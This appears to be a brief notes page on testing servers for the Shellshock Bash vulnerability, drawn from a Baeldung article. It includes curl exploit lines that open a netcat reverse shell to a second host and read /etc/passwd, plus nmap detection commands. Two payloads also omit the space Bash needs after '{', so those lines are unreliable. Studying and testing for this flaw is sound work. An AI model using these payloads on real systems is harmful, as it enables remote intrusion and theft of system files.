---
title: "Test Whether a Server Is Vulnerable to Shellshock Bug"
date: 2022-11-28T15:35:30+08:00
menu:
  sidebar:
    name: "Test Whether a Server Is Vulnerable to Shellshock Bug"
    identifier: linux-shell-shellshock-bug
    weight: 10
tags: ["URL", "Linux", "SHELL", "command line"]
categories: ["URL", "Linux", "SHELL", "command line"]
hero: images/hero/linux.png
---

- [Test Whether a Server Is Vulnerable to Shellshock Bug](https://www.baeldung.com/linux/shellshock-bug)

##### The Shellshock Bug

```bash
env x=' () {:;};'
```

##### Exploiting Shellshock Bug

- A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.
- The ignored commands from the user are put in the "SSH_ORIGINAL_COMMAND" environment variable. If the user's default shell is Bash, the Bash shell will parse the value of the "SSH_ORIGINAL_COMMAND" environment variable on start-up and run the embedded commands.

##### Examples of Shellshock Exploit Commands

```bash
## 1
curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443" 192.168.x.y/CGI-bin/hello.cgi

## 2
curl --insecure 192.168.x.x -H "User-Agent: () { :; }; /bin/cat /etc/passwd"
```

- use nmap script to test for the vulnerability

```bash
nmap -sV -p- --script http-shellshock 192.168.x.x
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 192.168.x.x
```
